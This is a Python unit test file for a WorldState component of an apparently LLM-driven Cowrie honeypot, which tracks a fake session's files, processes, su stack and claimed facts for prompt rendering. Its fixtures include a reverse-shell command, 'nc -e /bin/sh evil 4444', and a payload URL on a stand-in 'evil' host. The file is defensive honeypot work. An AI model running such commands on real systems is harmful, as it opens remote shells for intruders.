# SPDX-License-Identifier: BSD-3-Clause

"""Unit tests for cowrie.llm.worldstate."""

from __future__ import annotations

import unittest

from cowrie.llm.worldstate import WorldState


class TestWorldState(unittest.TestCase):
    def test_empty_renders_empty(self):
        w = WorldState()
        self.assertEqual(w.to_prompt_section(), "")

    def test_add_file_renders_with_metadata(self):
        w = WorldState()
        w.add_file(
            path="/tmp/p.sh",
            size_bytes=4823,
            sha256="abc1234567890def",
            source="downloaded",
            source_url="http://evil/payload.sh",
        )
        section = w.to_prompt_section()
        self.assertIn("/tmp/p.sh", section)
        self.assertIn("4823", section)
        self.assertIn("abc1234567890def", section)
        self.assertIn("http://evil/payload.sh", section)

    def test_files_capped_at_max(self):
        w = WorldState()
        cap = WorldState.MAX_FILES_IN_PROMPT
        for i in range(cap + 5):
            w.add_file(path=f"/tmp/f{i}", size_bytes=i, sha256=None, source="created")
        section = w.to_prompt_section()
        self.assertIn(f"... ({cap + 5 - cap} more, omitted)", section)
        # Last-modified-first ordering: the newest files survive the truncation.
        self.assertIn(f"/tmp/f{cap + 4}", section)
        # And the oldest files are NOT in the prompt.
        self.assertNotIn("/tmp/f0  size=0", section)

    def test_env_vars_render(self):
        w = WorldState()
        w.add_env("EVIL_HOME", "/opt/evil")
        section = w.to_prompt_section()
        self.assertIn("EVIL_HOME", section)
        self.assertIn("/opt/evil", section)

    def test_two_world_states_do_not_share_state(self):
        a = WorldState()
        b = WorldState()
        a.add_file(path="/x", size_bytes=1, sha256=None, source="created")
        self.assertEqual(len(b.files), 0)

    def test_idempotent_same_path_overwrites(self):
        w = WorldState()
        w.add_file(path="/tmp/x", size_bytes=10, sha256="a", source="downloaded")
        w.add_file(path="/tmp/x", size_bytes=20, sha256="b", source="edited")
        self.assertEqual(len(w.files), 1)
        self.assertEqual(w.files["/tmp/x"].size_bytes, 20)
        self.assertEqual(w.files["/tmp/x"].sha256, "b")

    def test_empty_path_ignored(self):
        w = WorldState()
        w.add_file(path="", size_bytes=10, sha256="a", source="downloaded")
        self.assertEqual(len(w.files), 0)


class TestProcesses(unittest.TestCase):
    def test_add_process_returns_pid_and_tracks(self):
        w = WorldState()
        pid = w.add_process("python3 x.py", user="root")
        self.assertGreater(pid, 1)
        self.assertIn(pid, w.processes)
        self.assertIn(pid, w.bg_pids)
        self.assertEqual(w.processes[pid].command, "python3 x.py")

    def test_pids_are_unique_and_incrementing(self):
        w = WorldState()
        p1 = w.add_process("a", user="root")
        p2 = w.add_process("b", user="root")
        self.assertNotEqual(p1, p2)

    def test_empty_command_ignored(self):
        w = WorldState()
        self.assertEqual(w.add_process("   ", user="root"), 0)
        self.assertEqual(len(w.processes), 0)

    def test_processes_render_in_prompt(self):
        w = WorldState()
        w.add_process("nc -e /bin/sh evil 4444", user="root")
        section = w.to_prompt_section()
        self.assertIn("nc -e /bin/sh evil 4444", section)
        self.assertIn("Background processes", section)


class TestUserStack(unittest.TestCase):
    def test_effective_user_default_is_login(self):
        w = WorldState()
        self.assertEqual(w.effective_user("bob"), "bob")

    def test_push_then_effective(self):
        w = WorldState()
        w.push_user("root")
        self.assertEqual(w.effective_user("bob"), "root")

    def test_pop_restores(self):
        w = WorldState()
        w.push_user("root")
        self.assertEqual(w.pop_user(), "root")
        self.assertEqual(w.effective_user("bob"), "bob")

    def test_pop_empty_is_none(self):
        w = WorldState()
        self.assertIsNone(w.pop_user())

    def test_nested_su(self):
        w = WorldState()
        w.push_user("root")
        w.push_user("postgres")
        self.assertEqual(w.effective_user("bob"), "postgres")
        w.pop_user()
        self.assertEqual(w.effective_user("bob"), "root")

    def test_user_stack_renders_in_prompt(self):
        w = WorldState()
        w.push_user("root")
        self.assertIn("Effective-user stack", w.to_prompt_section())


class TestFactLedger(unittest.TestCase):
    """What we already told the session, so a re-probe replays it.

    An attacker checking for a honeypot asks the same thing twice and
    compares — which is exactly what FINGERPRINT_PROBE does. Recording the
    first answer lets the model repeat rather than re-derive.
    """

    def test_records_and_retrieves(self):
        w = WorldState()
        w.record_claim(key="os.kernel", excerpt="Linux h4 5.15.0", turn=1, source="llm")
        claim = w.claim_for("os.kernel")
        self.assertIsNotNone(claim)
        self.assertEqual(claim.excerpt, "Linux h4 5.15.0")
        self.assertEqual(claim.turn, 1)

    def test_last_write_wins(self):
        w = WorldState()
        w.record_claim(key="hw.mem", excerpt="first", turn=1, source="llm")
        w.record_claim(key="hw.mem", excerpt="second", turn=2, source="deterministic")
        self.assertEqual(w.claim_for("hw.mem").excerpt, "second")
        self.assertEqual(w.claim_for("hw.mem").source, "deterministic")

    def test_blank_key_or_answer_is_ignored(self):
        w = WorldState()
        w.record_claim(key="", excerpt="x", turn=1, source="llm")
        w.record_claim(key="os.kernel", excerpt="", turn=1, source="llm")
        self.assertEqual(w.told_facts, {})

    def test_long_excerpts_are_truncated(self):
        w = WorldState()
        w.record_claim(key="k", excerpt="x" * 5000, turn=1, source="llm")
        self.assertLessEqual(
            len(w.claim_for("k").excerpt), WorldState.MAX_FACT_EXCERPT + 1
        )

    def test_unknown_key_returns_none(self):
        self.assertIsNone(WorldState().claim_for("nope"))
        self.assertIsNone(WorldState().claim_for(None))

    # -- prompt rendering ---------------------------------------------------

    def test_llm_claims_render_into_the_prompt(self):
        w = WorldState()
        w.record_claim(
            key="os.kernel", excerpt="Linux h4 5.15.0-122", turn=1, source="llm"
        )
        section = w.to_prompt_section()
        self.assertIn("os.kernel", section)
        self.assertIn("5.15.0-122", section)
        self.assertIn("repeat the same values", section)

    def test_deterministic_claims_do_not_spend_prompt_tokens(self):
        """The emulator reproduces its own answers by construction, so
        reminding the model of them costs input tokens every turn and buys
        nothing. This block lands in the *uncached* tail."""
        w = WorldState()
        w.record_claim(key="id.user", excerpt="root", turn=1, source="deterministic")
        self.assertEqual(w.to_prompt_section(), "")

    def test_a_facts_only_world_still_renders(self):
        """Regression guard for the early-return guard.

        If told_facts is left out of it, a session whose only state is
        recorded facts renders no section at all — silently, with no error
        and nothing in the logs.
        """
        w = WorldState()
        self.assertEqual(w.to_prompt_section(), "")
        w.record_claim(key="os.kernel", excerpt="Linux h4", turn=1, source="llm")
        self.assertNotEqual(w.to_prompt_section(), "")

    def test_prompt_block_is_capped(self):
        w = WorldState()
        cap = WorldState.MAX_FACTS_IN_PROMPT
        for i in range(cap + 5):
            w.record_claim(key=f"k{i}", excerpt=f"value{i}", turn=i, source="llm")
        section = w.to_prompt_section()
        self.assertIn(f"({cap + 5 - cap} more, omitted)", section)
        # Most recent survive the truncation.
        self.assertIn(f"value{cap + 4}", section)

    def test_newlines_are_flattened_so_one_claim_is_one_line(self):
        w = WorldState()
        w.record_claim(key="k", excerpt="line1\nline2", turn=1, source="llm")
        rendered = [
            ln for ln in w.to_prompt_section().splitlines() if ln.startswith("  [k]")
        ]
        self.assertEqual(len(rendered), 1)
        self.assertIn("line1", rendered[0])
        self.assertIn("line2", rendered[0])
